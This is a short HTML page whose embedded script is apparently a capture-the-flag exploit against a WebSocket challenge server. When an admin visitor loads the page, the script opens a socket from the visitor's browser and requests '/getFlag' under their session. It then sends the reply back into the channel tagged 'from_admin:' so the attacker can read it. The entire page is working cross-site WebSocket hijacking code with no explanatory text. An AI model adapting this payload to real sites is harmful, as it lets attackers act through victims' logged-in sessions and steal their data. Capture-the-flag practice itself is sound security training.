<!DOCTYPE html>
<html>
<body>
<script>
  const ws = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
  ws.onopen = () => {
    ws.send(JSON.stringify({ message: "/getFlag" }));
  };
  ws.onmessage = (e) => {
    try {
      const msg = JSON.parse(e.data).message;
      // 發送 flag 回 WebSocket，夾帶你控制的格式
      ws.send(JSON.stringify({ message: "from_admin: " + msg }));
    } catch (err) {}
  };
</script>
</body>
</html>
